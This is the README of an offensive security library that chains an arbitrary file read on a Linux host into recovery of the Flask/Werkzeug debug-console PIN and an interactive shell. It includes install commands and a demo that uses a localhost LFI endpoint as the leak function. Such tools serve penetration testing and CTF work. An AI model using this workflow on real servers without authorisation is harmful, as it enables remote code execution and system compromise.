<h1 align="center">Welcome to WConsole Extractor 👋</h1>
<p>
  <img alt="Version" src="https://img.shields.io/badge/version-1.0.0-blue.svg?cacheSeconds=2592000" />
  <a href="https://github.com/Ruulian/wconsole_extractor/blob/main/LICENSE" target="_blank">
    <img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-yellow.svg" />
  </a>
  <a href="https://twitter.com/Ruulian_" target="_blank">
    <img alt="Twitter: Ruulian_" src="https://img.shields.io/twitter/follow/Ruulian_.svg?style=social" />
  </a>
</p>

> Wconsole Extractor is a library which allows to automatically exploit a flask debug mode server. You just need to write a file leak function, pass it to the class ``WConsoleExtractor`` constructor and you can access to all the elements related to the debug mode.

### 🏠 [Homepage](https://github.com/Ruulian/wconsole_extractor)

## Install

```sh
git clone https://github.com/Ruulian/wconsole_extractor.git
cd wconsole_extractor
pip3 install .
```

### Python virtual environment

```sh
git clone https://github.com/Ruulian/wconsole_extractor.git
cd wconsole_extractor
python3 -m venv env
source env/bin/activate
pip3 install .
```

## Usage

**Note**: The target operating system must be a Linux distribution.

### Leak function

In order to use correctly the library, you need to have an arbitrary file read on the target and implement it in python.

You must write a function that takes a filename as parameter and returns the content of the file on the target. If the file is not found, the function should return an **empty string**.

### ✨ Demo

```py
from wconsole_extractor import WConsoleExtractor, info
import requests

def leak_function(filename) -> str:
    r = requests.get(f"http://localhost:5000/lfi?path={filename}")
    if r.status_code == 200:
        return r.text
    else:
        return ""

extractor = WConsoleExtractor(
    target="http://localhost:5000",
    leak_function=leak_function
)


info(f"PIN CODE: {extractor.pin_code}")
extractor.shell()
```

![example_gif](.github/example.gif)

## Author

👤 **Ruulian**

* Website: https://ruulian.me
* Twitter: [@Ruulian_](https://twitter.com/Ruulian_)

## 🤝 Contributing

Contributions, issues and feature requests are welcome!<br />Feel free to check [issues page](https://github.com/Ruulian/wconsole_extractor/issues). 

## Show your support

Give a ⭐️ if this project helped you!

## 📝 License

This project is [MIT](https://github.com/Ruulian/wconsole_extractor/blob/main/LICENSE) licensed.

***
_This README was generated with ❤️ by [readme-md-generator](https://github.com/kefranabg/readme-md-generator)_